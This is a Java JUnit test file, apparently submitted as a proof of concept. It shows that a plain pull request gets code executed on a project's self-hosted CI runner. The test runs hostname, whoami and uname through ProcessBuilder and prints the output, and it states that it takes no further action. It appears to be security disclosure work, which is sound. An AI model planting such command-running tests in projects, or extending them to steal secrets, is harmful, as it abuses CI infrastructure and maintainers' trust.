/*
 * Copyright (C) 2026 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License"); you may not
 * use this file except in compliance with the License. You may obtain a copy of
 * the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
 * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
 * License for the specific language governing permissions and limitations under
 * the License.
 */
package com.google.cloud.teleport.v2.kafka.utils;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import org.junit.Test;

/**
 * PoC — recon-only, non-destructive. Confirms code execution on the self-hosted
 * runner reached via a plain pull_request trigger (no maintainer approval).
 * Does NOT exfiltrate secrets, persist, or scan the network.
 */
public class PocReconTest {

  private static String run(String... cmd) throws Exception {
    Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
    StringBuilder sb = new StringBuilder();
    try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
      String line;
      while ((line = r.readLine()) != null) {
        sb.append(line).append('\n');
      }
    }
    p.waitFor();
    return sb.toString().trim();
  }

  @Test
  public void pocReconOnly() throws Exception {
    System.out.println("=== PoC: code execution on self-hosted runner (plain pull_request, no approval) ===");
    System.out.println("hostname: " + run("hostname"));
    System.out.println("whoami: " + run("whoami"));
    System.out.println("uname -a: " + run("uname", "-a"));
    System.out.println("=== end PoC recon — no further action taken ===");
  }
}
